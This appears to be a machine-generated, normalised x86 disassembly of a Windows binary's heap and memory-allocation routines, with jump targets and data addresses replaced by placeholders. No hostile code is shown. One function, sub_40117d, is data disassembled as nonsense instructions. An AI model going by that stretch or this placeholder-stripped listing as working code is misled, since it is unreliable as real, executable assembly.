sub_40115b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403348
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40117d
pop ebp
adc [ eax ] eax
adc [ bx + si ] eax
jno r-xdata
add [ eax ] al
add [ eax ] al
inc esi
jge r-xdata
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
mov [ ecx ] edx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add [ edi + edx * 2 ] cl
inc eax
add [ eax ] bl
push edi
inc eax
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] ch
push edi
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x54110040 ] al
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f80040 ] cl
inc eax
add [ ecx + 0x4011 ] cl
sar bh 0x25
jb r-xdata
mov esp 0x8b0047c1
sar bh 0x25
mov eax 0x8b0047c1
sar bh 0x25
mov ah 0xc1
inc edi
add [ ebx - 0x4fda0040 ] cl
rol [ edi ] 0x8b
sar bh 0x25
lodsb [ esi ]
rol [ edi ] 0x8b
sar bh 0x25
test al 0xc1
inc edi
add [ ebx - 0x5bda0040 ] cl
rol [ edi ] 0x8b
sar bh 0x25
mov al [ 0xffffffff8b0047c1 ]
sar bh 0x25
pushfd
rol [ edi ] 0x8b
sar bh 0x25
cwde
rol [ edi ] 0x8b
sar bh 0x25
in al dx
rol [ edi ] 0x8b
sar bh 0x25
xchg esp eax
rol [ edi ] 0x8b
sar bh 0x25
nop
rol [ edi ] 0x8b
sar bh 0x25
mov ecx es
inc edi
add [ ebx + 0x425ffc0 ] cl
retn 0x47
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401398
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401358
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013f0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401398
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401438
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401420
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401420
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013f0
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013f0
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401420
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40153c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f0
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401368
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401370
xor eax eax
mov [ ebx ] eax
sub_4015a0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401368
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401368
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f0
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401370
xor eax eax
mov [ ebx ] eax
sub_401618
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401370
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401420
mov [ rw-data ] 0x1
sub_4016d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401368
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401764
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401370
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40153c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016d0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401438
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401618
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401420
jmp r-xdata
sub_401874
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015a0
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401438
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015a0
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401618
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401438
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016d0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401618
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401420
jmp r-xdata
sub_401998
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401764
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401438
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401618
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a8
jmp r-xdata
sub_401a24
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ada
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401378
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
push 0xff8
push 0x0
call sub_401358
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ae1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401388
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bbe
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401380
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401370
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax rw-data
call sub_4013e8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401390
retn
push rw-data
call sub_401388
sub_401bc8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c2c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c5c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e30
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cb0
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c8c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc8
add ebx esi
mov [ rw-data ] 0x6
sub_401d48
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c2c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401998
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401998
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c5c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a8
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cb0
sub_401e30
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d80
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb8
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c8c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f04
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb8
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401438
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d48
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c5c
sub [ edi + 0x4 ] 0x4
sub_401f90
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017e4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f04
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fbc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401874
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f04
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401ff0
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_40201c
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e30
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f90
test al al
jne r-xdata
mov eax esi
call sub_401ff0
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402110
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a24
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40228c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401380
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_40201c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401388
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ab4
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ab4
jmp r-xdata
sub_4022a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402432
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a24
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401380
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401388
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
